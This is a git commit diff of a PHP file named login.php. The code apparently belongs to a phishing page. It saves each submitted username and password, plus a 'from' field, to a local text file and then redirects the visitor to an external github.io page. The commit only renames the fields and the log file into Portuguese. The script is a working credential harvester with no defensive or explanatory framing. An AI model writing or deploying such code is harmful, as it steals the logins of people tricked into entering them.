529cb3e0258397bc37f603cd603a089d5d26852f
Walker1291 <76238141+Walker1291@users.noreply.github.com>
2021-01-24 13:42:21 -0300

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Connected: " . $_POST['from'] . "  Username: " . $_POST['id'] . " Pass: " . $_POST['pass']      .  "\n", FILE_APPEND);
+file_put_contents("node de usuário.txt", "Connected: " . $_POST['from'] . "  nome de usuário: " . $_POST['id'] . " Senha: " . $_POST['Senha']      .  "\n", FILE_APPEND);
 header('Location: https://m4f1aclow3n.github.io/ignore/');
 exit();
